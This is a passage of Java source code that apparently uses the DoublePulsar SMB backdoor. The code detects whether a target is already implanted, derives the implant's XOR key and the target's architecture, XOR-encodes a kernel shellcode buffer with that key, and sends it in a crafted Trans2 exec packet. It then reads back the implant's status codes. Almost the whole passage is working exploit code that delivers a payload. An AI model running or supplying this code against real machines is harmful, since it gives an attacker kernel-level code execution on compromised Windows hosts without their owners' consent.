        int treeid = treeRespBuffer.getShort(0x24) & 0xFFFF;
        System.out.println("TreeID: " + treeid);

        //int treeId = readUInt16LE(treeConnectResponse, 28);
        System.out.printf("Tree ID = %d\n", treeid);

        /* =========================
         * Trans2 session setup
         * ========================= */

        byte[] modifiedTrans2 = Arrays.copyOf(trans2SessionSetup, trans2SessionSetup.length);

        //writeUInt16LE(modifiedTrans2, userIdOffset, (short)userid);
        //writeUInt16LE(modifiedTrans2, treeIdOffset, (short)treeid);

        // Tree ID
        modifiedTrans2[28] = treeConnectResponse[28];
        modifiedTrans2[29] = treeConnectResponse[29];

        // User ID
        modifiedTrans2[32] = sessionSetupResponse[32];
        modifiedTrans2[33] = sessionSetupResponse[33];

        System.out.println("Sending trans2 session setup - ping command\n");
        out.write(modifiedTrans2);

        int trans2_response = in.read(buffer);
        byte[] finalResponse = Arrays.copyOf(buffer, trans2_response);

        ByteBuffer trans2Response = ByteBuffer.wrap(finalResponse);
        trans2Response.order(ByteOrder.LITTLE_ENDIAN);

        hexdump(finalResponse, 16);

        if ((finalResponse[34]) == 81)
        {
            // signature = final_response[18:22]
            byte[] signature = Arrays.copyOfRange(finalResponse, 18, 22);
            int signatureLong = ByteBuffer.wrap(signature)
                    .order(ByteOrder.LITTLE_ENDIAN)
                    .getInt();

            int key = calculateDoublepulsarXorKey(signatureLong);

            // arch_signature = final_response[18:26]
            byte[] archSignature = Arrays.copyOfRange(finalResponse, 18, 26);
            long archSignatureLong = ByteBuffer.wrap(archSignature)
                    .order(ByteOrder.LITTLE_ENDIAN)
                    .getLong();

            String arch = calculateDoublepulsarArch(archSignatureLong);

            System.out.printf(
                    "[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: 0x%08X%n",
                    ip,
                    arch,
                    key
            );

            /* =========================
             * XOR the shellcode
             * ========================= */

            byte[] xorBytes = byteXor(modifiedKernelBytecode, key);
            //hexdump(xorBytes, 16);

            //int entireShellcodeSize = modifiedKernelBytecode.length;
            //must pad the value to 4096

            System.out.println("Generating the parameters...");

            /* =========================
             * Build parameters
             * ========================= */

            // Pack values as little-endian uint32
            byte[] entireSize = ByteBuffer.allocate(4)
                    .order(ByteOrder.LITTLE_ENDIAN)
                    .putInt(4096)
                    .array();

            byte[] chunkSize = ByteBuffer.allocate(4)
                    .order(ByteOrder.LITTLE_ENDIAN)
                    .putInt(4096)
                    .array();

            byte[] offset = ByteBuffer.allocate(4)
                    .order(ByteOrder.LITTLE_ENDIAN)
                    .putInt(0000)
                    .array();

            /* =========================
             * Concatenate parameters
             * ========================= */

            byte[] parameters = new byte[12];

            System.arraycopy(entireSize, 0, parameters, 0, 4);
            System.arraycopy(chunkSize, 0, parameters, 4, 4);
            System.arraycopy(offset, 0, parameters, 8, 4);
            hexdump(parameters, 16);

            /* =========================
             * XOR parameters
             * ========================= */

            byte[] xorParameters = byteXor(parameters, key);
            hexdump(xorParameters, 16);

            /* =========================
             * Build TRANS2 exec packet
             * ========================= */

            //implementation 2
            /* Generate Doublepulsar Execution Packet */

            //implementation 1

            byte[] trans2ExecPacket = hexToBytes("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000");

            byte[] dopuExecPacket = Arrays.copyOf(trans2ExecPacket, trans2ExecPacket.length);

            int trans2PacketLen = dopuExecPacket.length;
            System.out.printf("Total size of SMB packet:  %d%n", trans2PacketLen);

            int packetLen = trans2PacketLen + 4096 + 12;
            System.out.printf("Total size of SMB packet & shellcode:  %d%n", packetLen);

            System.out.println("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet");

            int mergedPacketLen = trans2PacketLen + 4096 + 12 - 4;
            System.out.printf("UPDATED:  Total size of SMB packet & shellcode:  %d%n", mergedPacketLen);

            /* =========================
             * Update SMB length (big endian)
             * ========================= */

            byte[] smbLength = ByteBuffer.allocate(2)
                    .order(ByteOrder.BIG_ENDIAN)
                    .putShort((short) mergedPacketLen)
                    .array();

            dopuExecPacket[2] = smbLength[0];
            dopuExecPacket[3] = smbLength[1];

            /* =========================
             * Data counts (little endian)
             * ========================= */

            byte[] totalDataCount = ByteBuffer.allocate(2)
                    .order(ByteOrder.LITTLE_ENDIAN)
                    .putShort((short) 4096)
                    .array();

            byte[] dataCount = ByteBuffer.allocate(2)
                    .order(ByteOrder.LITTLE_ENDIAN)
                    .putShort((short) 4096)
                    .array();

            byte[] byteCount = ByteBuffer.allocate(2)
                    .order(ByteOrder.LITTLE_ENDIAN)
                    .putShort((short) (4096 + 12)) //changed from 12 ???
                    .array();

            // Update packet fields
            dopuExecPacket[39] = totalDataCount[0];
            dopuExecPacket[40] = totalDataCount[1];

            dopuExecPacket[59] = dataCount[0];
            dopuExecPacket[60] = dataCount[1];

            dopuExecPacket[67] = byteCount[0];
            dopuExecPacket[68] = byteCount[1];

            /* =========================
             * Tree ID + User ID
             * ========================= */

            //dopuExecPacket[28] = treeId[0];
            //dopuExecPacket[29] = treeId[1];

            //dopuExecPacket[32] = userId[0];
            //dopuExecPacket[33] = userId[1];

            dopuExecPacket[28] = treeConnectResponse[28];
            dopuExecPacket[29] = treeConnectResponse[29];

            dopuExecPacket[32] = sessionSetupResponse[32];
            dopuExecPacket[33] = sessionSetupResponse[33];

            //writeUInt16LE(dopuExecPacket, userIdOffset, (short)userid);
            //writeUInt16LE(dopuExecPacket, treeIdOffset, (short)treeid);

            /* =========================
             * Append parameters + payload
             * ========================= */

            byte[] finalPacket = new byte[
                    dopuExecPacket.length + xorParameters.length + xorBytes.length
                    ];

            System.arraycopy(dopuExecPacket, 0, finalPacket, 0, dopuExecPacket.length);
            System.arraycopy(xorParameters, 0, finalPacket, dopuExecPacket.length, xorParameters.length);
            System.arraycopy(xorBytes, 0, finalPacket, dopuExecPacket.length + xorParameters.length, xorBytes.length);

            //System.out.println("hex content of the hex packet");
            //hexdump(finalPacket, 16);
            System.out.println("Total Length of the final hex packet " + finalPacket.length);

            /* =========================
             * Send packet
             * ========================= */

            out.write(finalPacket);
            byte[] smbResponse = new byte[1024];
            int respLen = in.read(smbResponse);

            /* =========================
             * Status checks
             * ========================= */

            if ((smbResponse[9]) == 0x02 &&
                    (smbResponse[10] & 0xFF) == 0x00 &&
                    (smbResponse[11] & 0xFF) == 0x00 &&
                    (smbResponse[12] & 0xFF) == 0xC0) {

                System.out.println("DOPU returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!");
            }

            if ((smbResponse[34]  & 0xFF ) == 82) {
                System.out.println("DOPU returned:  Success!");
            } else if ((smbResponse[34]  & 0xFF ) == 98) {
                System.out.println("DOPU returned:  Invalid parameters!");
            } else if ((smbResponse[34]  & 0xFF ) == 114) {
                System.out.println("DOPU returned:  Allocation failure!");
            } else {
                System.out.println("DOPU didn't succeed");
            }

            /* =========================
             * Tree disconnect
             * ========================= */

            byte[] treeDisconnect = hexToBytes("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000");

            treeDisconnect[28] = treeConnectResponse[28];
            treeDisconnect[29] = treeConnectResponse[29];

            treeDisconnect[32] = sessionSetupResponse[32];
            treeDisconnect[33] = sessionSetupResponse[33];

            out.write(treeDisconnect);
            in.read(smbResponse);

            /* =========================
             * Logoff
             * ========================= */

            byte[] logoff = hexToBytes( "00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000");

            logoff [28] = treeConnectResponse[28];
            logoff [29] = treeConnectResponse[29];

            logoff [32] = sessionSetupResponse[32];
            logoff [33] = sessionSetupResponse[33];

            out.write(logoff);
            in.read(smbResponse);

            socket.close();
        }  else {
            System.out.print("No DoublePulsar detected!\n");
            socket.close();
        }
    }
}
